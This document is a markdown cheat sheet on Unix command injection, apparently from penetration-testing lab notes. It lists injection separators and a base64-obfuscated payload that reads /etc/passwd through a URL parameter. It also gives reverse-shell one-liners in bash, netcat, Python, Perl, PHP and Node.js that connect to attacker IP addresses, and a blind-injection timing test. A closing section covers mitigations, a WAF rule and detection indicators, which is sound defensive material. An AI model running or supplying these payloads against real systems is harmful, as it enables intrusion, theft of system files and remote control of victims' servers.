# Command Injection

---

> [!NOTE]
>
> Command Injection in Unix-based OS



**Custom Wordlists** - `/s3cr3t_bin/wordlists/command_injection_custom.txt`

```bash
# first investigate and identify what linux-based utilities are present into the remote victim system
- /s3cr3t_bin/wordlists/capability_checks_custom.txt
```
---

## Different Command Prepending Techniques & Trade-offs

### 1. Semicolon (`;`)
```bash
; whoami
```
- **Works**: Always, unconditional execution
- **Trade-off**: Requires previous command completion (fails or succeeds)
- **Detection**: Easy to spot in logs

### 2. Pipe (`|`)
```bash
| whoami
```
- **Works**: Passes stdout of first command to second
- **Trade-off**: Second command must accept stdin; first command output matters
- **Use case**: When you need to process output

### 3. AND (`&&`)
```bash
&& whoami
```
- **Works**: Only if previous command succeeds (exit 0)
- **Trade-off**: Conditional on success
- **Use case**: Chaining dependent commands

### 4. OR (`||`)
```bash
|| whoami
```
- **Works**: Only if previous command fails
- **Trade-off**: Requires failure to trigger
- **Use case**: Fallback execution

### 5. Background (`&`)
```bash
& whoami &
```
- **Works**: Runs in background, doesn't wait
- **Trade-off**: No output capture, process management issues
- **Use case**: Long-running processes, reverse shells

### 6. Newline/Line Feed
```bash
%0a whoami
%0d%0a whoami  # CRLF
```
- **Works**: Bypasses some input filters
- **Trade-off**: URL encoding needed in web contexts
- **Use case**: Encoded contexts (HTTP parameters)

### 7. Subshell (`` ` `` or `$()`) / Inline Execution
```bash
`whoami`
$(whoami)
```
- **Works**: Command substitution, output becomes part of parent command
- **Trade-off**: Output gets interpreted by parent context
- **Use case**: Inline execution, data exfiltration
  - Could be used to bypass typical input sanitization -> `wh$()oami`

---
## Local File Read

```bash
# base64 encode the payload
echo "cat /etc/passwd" |base64
# Chain the command with inline execution
http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;\`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d\`
```
---
## Reverse Shell Techniques
- Always BurpSuite URL-encode key characters for web payload delivery.
### 1. Bash TCP
```bash
# Invoke bash shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'echo >/dev/tcp/127.0.0.1/4444' 2>&1

# Explicitly invoke bash (not zsh) 
/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'

# encode the payload: Use padding with spaces to exclude + and = symbols from the final encoding
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | base64 -w 0
# payload for RCE
echo "<base64payload>" | base64 -d | bash
```
- **Pros**: Built-in, no external deps
- **Cons**: Bash-specific, `/dev/tcp` not always enabled
- **Detection**: Easily flagged by EDR

### 2. Netcat (Traditional)
```bash
nc -e /bin/bash 127.0.0.1 4444
```
- **Pros**: Simple, reliable
- **Cons**: `-e` often disabled in modern nc versions
- **Alternative**: `nc` FIFO method below

### 3. Netcat (FIFO/Named Pipe) / Inline Execution
```bash
`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.45.194 4444 >/tmp/f`

# alternate
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.237 8061 >/tmp/f
```
- **Pros**: Works with restricted nc
- **Cons**: Leaves artifacts (`/tmp/f`)

### 4. Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.51",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
- **Pros**: Widely available, stable
- **Cons**: Verbose, easily detected
- **Variants**: Python3, use `subprocess.run()`

### 5. Perl
```bash
perl -e 'use Socket;$i="192.168.49.51";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- **Pros**: Often installed by default
- **Cons**: Complex syntax

### 6. PHP
Need to check `phpinfo.php` file for `disable_functions` list and document_root (drop the webshell).

```bash
php -r '$sock=fsockopen("10.0.0.1",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```
- **Pros**: Common in web contexts
- **Cons**: Requires PHP CLI

### 7. Node.js
```js
echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" >/var/tmp/offsec.js ; node /var/tmp/offsec.js
```

---
## Blind OS Command Injection Bypass
With blind OS command injection,we will not receive immediate output confirming that our execution has succeeded.

To set a benchmark, we will use time to measure how long our curl request takes against a server we know is down.
```bash
# if the output took 10.014s, set this as benchmark
time curl http://ci-sandbox:80/php/blind.php?ip=172.0.0.1
# if this command took more than 10.00 sec then clearly the sleep command ran
time curl "http://ci-sandbox:80/php/blind.php?ip=172.0.0.1;sleep%2020"
```


---
## Mitigation Strategies

### 1. Input Validation (Whitelist)
```python
import re
# Only allow alphanumeric and specific safe chars
if not re.match(r'^[a-zA-Z0-9_\-\.]+$', user_input):
    raise ValueError("Invalid input")
```
- **Best practice**: Never blacklist, always whitelist

### 2. Parameterized Execution
```python
# BAD
os.system(f"ping -c 4 {user_input}")

# GOOD
subprocess.run(['ping', '-c', '4', user_input], check=True)
```
- **Key**: Pass arguments as array, not string

### 3. Escape Shell Metacharacters
```python
import shlex
safe_input = shlex.quote(user_input)
```
- **Limitation**: Not foolproof, prefer parameterization

### 4. Sandboxing/Isolation
- Use containers (Docker, Podman)
- `chroot` jails
- AppArmor/SELinux profiles
- Restricted shells (rbash)

### 5. Principle of Least Privilege
- Don't run services as root
- Use capabilities instead of setuid
- Drop privileges after initialization

### 6. WAF/IDS Rules
```
# ModSecurity example
SecRule ARGS "@rx (?:\||;|`|\$\(|&&|\|\||>|<)" \
    "id:1234,phase:2,deny,status:403,msg:'Command injection attempt'"
```

### 7. Runtime Detection
- Monitor process execution (auditd, sysdig)
- Detect shell spawning from web processes
- Alert on `/dev/tcp` usage
- Track outbound connections from unexpected processes

### 8. Code-level Defenses
```python
# Avoid shell=True
subprocess.run(cmd, shell=False)  # Forces array-style args

# Set timeout
subprocess.run(cmd, timeout=5)

# Restrict environment
subprocess.run(cmd, env={'PATH': '/usr/bin'})
```

### 9. Network Controls
- Egress filtering (block outbound shells)
- Application-level firewalls
- Monitor for reverse shell patterns (low-port connections)

---
## Detection Indicators

**Process anomalies:**

- `bash -i` from web server process
- `/dev/tcp/` in process arguments
- Base64 decode followed by shell execution
- Netcat with redirect operators



**Network patterns:**

- Outbound connections from web/app servers
- Long-lived TCP connections to non-standard ports
- Interactive shell traffic patterns (keystroke timing)



**File system:**

- FIFO files in `/tmp`, `/dev/shm`
- Recently modified shell history
- Suspicious cron jobs

---
